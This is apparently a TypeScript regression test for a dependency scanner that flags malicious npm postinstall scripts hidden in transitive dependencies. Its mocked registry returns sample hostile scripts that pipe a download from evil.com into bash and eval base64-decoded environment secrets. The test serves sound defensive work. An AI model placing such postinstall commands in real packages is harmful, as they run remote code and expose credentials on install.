/**
 * Regression Test — postmark-mcp Attack Pattern
 *
 * Validates that DeepDependencyScanner detects malicious postinstall scripts
 * hidden in transitive dependencies, simulating the 2025 postmark-mcp supply
 * chain attack.
 *
 * Fixture layout (tests/fixtures/postmark-project/):
 *   package.json          → direct dep: postmark@^3.0.0
 *   package-lock.json     → postmark@3.0.0 → evil-pkg@1.0.0 → deep-evil@1.0.0
 *
 * NPMRegistry.fetchPackageScripts is mocked so no real network calls are made.
 *
 * Validates: Requirements 10.1, 10.2, 10.3, 10.4, 10.5
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import { resolve } from 'path';
import { DeepDependencyScanner } from '../../src/security/DeepDependencyScanner.js';
import { LockFileParser } from '../../src/security/LockFileParser.js';
import { PatternMatcher } from '../../src/security/PatternMatcher.js';
import { RiskScorer } from '../../src/security/RiskScorer.js';
import { IssueGenerator } from '../../src/security/IssueGenerator.js';
import { PostInstallDetector } from '../../src/security/PostInstallDetector.js';
import { PackageJsonParser } from '../../src/security/PackageJsonParser.js';
import { NPMRegistry } from '../../src/services/NPMRegistry.js';
import { RateLimiter } from '../../src/ratelimit/RateLimiter.js';

// ---------------------------------------------------------------------------
// Fixture paths
// ---------------------------------------------------------------------------

const FIXTURE_DIR = resolve('tests/fixtures/postmark-project');
const PACKAGE_JSON_PATH = resolve(FIXTURE_DIR, 'package.json');
const LOCK_FILE_PATH = resolve(FIXTURE_DIR, 'package-lock.json');

// ---------------------------------------------------------------------------
// Shared instances
// ---------------------------------------------------------------------------

const patternMatcher = new PatternMatcher();
const riskScorer = new RiskScorer();
const issueGenerator = new IssueGenerator();
const lockFileParser = new LockFileParser();
const rateLimiter = new RateLimiter({ maxConcurrent: 20, maxRequests: 80, windowMs: 60_000 });

/**
 * Build a scanner with a mocked NPMRegistry.fetchPackageScripts.
 *
 * Script map:
 *   postmark@3.0.0  → {} (no suspicious scripts)
 *   evil-pkg@1.0.0  → { postinstall: 'curl http://evil.com/payload | bash' }
 *   deep-evil@1.0.0 → { postinstall: 'curl http://evil.com/deep | bash' }
 *   everything else → {}
 */
function buildScanner(): { scanner: DeepDependencyScanner; registry: NPMRegistry } {
  const registry = new NPMRegistry();

  const fetchPackageScripts = vi.fn(
    async (name: string, version: string): Promise<Record<string, string> | null> => {
      if (name === 'evil-pkg' && version === '1.0.0') {
        // Simulates postmark-mcp attack: curl + eval + base64 + env access → score > 70
        return {
          postinstall:
            "curl http://evil.com/payload | bash && eval(Buffer.from(process.env.SECRET_KEY,'base64').toString())",
        };
      }
      if (name === 'deep-evil' && version === '1.0.0') {
        // Depth=3 malicious package with same pattern
        return {
          postinstall:
            "curl http://evil.com/deep | bash && eval(Buffer.from(process.env.API_KEY,'base64').toString())",
        };
      }
      // postmark and any other packages have no suspicious scripts
      return {};
    }
  );

  // Replace the real method with the mock
  registry.fetchPackageScripts = fetchPackageScripts;

  const postInstallDetector = new PostInstallDetector(
    registry,
    new PackageJsonParser(),
    patternMatcher,
    riskScorer,
    issueGenerator
  );

  const scanner = new DeepDependencyScanner(
    registry,
    lockFileParser,
    patternMatcher,
    riskScorer,
    issueGenerator,
    postInstallDetector,
    rateLimiter
  );

  return { scanner, registry };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('DeepDependencyScanner — postmark-mcp regression', () => {
  describe('deep mode (maxDepth=3)', () => {
    it('detects evil-pkg at depth=2 with severity error', async () => {
      const { scanner } = buildScanner();

      const result = await scanner.deepScan(PACKAGE_JSON_PATH, LOCK_FILE_PATH, {
        mode: 'deep',
        maxDepth: 3,
        checkNPMRegistry: false,
      });

      const evilPkgIssue = result.issues.find(
        (i) => i.description?.includes('evil-pkg')
      );

      expect(evilPkgIssue).toBeDefined();
      expect(evilPkgIssue!.severity).toBe('error');
      expect(evilPkgIssue!.description).toContain('root → postmark → evil-pkg');
    });

    it('includes depth=2 in the issue description for evil-pkg', async () => {
      const { scanner } = buildScanner();

      const result = await scanner.deepScan(PACKAGE_JSON_PATH, LOCK_FILE_PATH, {
        mode: 'deep',
        maxDepth: 3,
        checkNPMRegistry: false,
      });

      const evilPkgIssue = result.issues.find(
        (i) => i.description?.includes('evil-pkg')
      );

      expect(evilPkgIssue).toBeDefined();
      expect(evilPkgIssue!.description).toContain('depth: 2');
    });

    it('detects deep-evil at depth=3 with severity error', async () => {
      const { scanner } = buildScanner();

      const result = await scanner.deepScan(PACKAGE_JSON_PATH, LOCK_FILE_PATH, {
        mode: 'deep',
        maxDepth: 3,
        checkNPMRegistry: false,
      });

      const deepEvilIssue = result.issues.find(
        (i) => i.description?.includes('deep-evil')
      );

      expect(deepEvilIssue).toBeDefined();
      expect(deepEvilIssue!.severity).toBe('error');
    });

    it('includes depth=3 in the issue description for deep-evil', async () => {
      const { scanner } = buildScanner();

      const result = await scanner.deepScan(PACKAGE_JSON_PATH, LOCK_FILE_PATH, {
        mode: 'deep',
        maxDepth: 3,
        checkNPMRegistry: false,
      });

      const deepEvilIssue = result.issues.find(
        (i) => i.description?.includes('deep-evil')
      );

      expect(deepEvilIssue).toBeDefined();
      expect(deepEvilIssue!.description).toContain('depth: 3');
    });

    it('does NOT flag postmark itself (no suspicious scripts)', async () => {
      const { scanner } = buildScanner();

      const result = await scanner.deepScan(PACKAGE_JSON_PATH, LOCK_FILE_PATH, {
        mode: 'deep',
        maxDepth: 3,
        checkNPMRegistry: false,
      });

      const postmarkIssue = result.issues.find(
        (i) => i.message?.includes('"postmark"')
      );

      expect(postmarkIssue).toBeUndefined();
    });
  });

  describe('shallow mode — validates blindness to transitive attack', () => {
    it('does NOT detect evil-pkg in shallow mode', async () => {
      const { scanner, registry } = buildScanner();

      // In shallow mode PostInstallDetector.analyze() is called.
      // Mock it to return [] so no direct-dep issues are raised either.
      const postInstallDetector = new PostInstallDetector(
        registry,
        new PackageJsonParser(),
        patternMatcher,
        riskScorer,
        issueGenerator
      );
      vi.spyOn(postInstallDetector, 'analyze').mockResolvedValue([]);

      const shallowScanner = new DeepDependencyScanner(
        registry,
        lockFileParser,
        patternMatcher,
        riskScorer,
        issueGenerator,
        postInstallDetector,
        rateLimiter
      );

      const result = await shallowScanner.deepScan(PACKAGE_JSON_PATH, null, {
        mode: 'shallow',
        checkNPMRegistry: false,
      });

      const evilPkgIssues = result.issues.filter(
        (i) => i.description?.includes('evil-pkg') || i.message?.includes('evil-pkg')
      );

      expect(evilPkgIssues).toHaveLength(0);
    });
  });
});
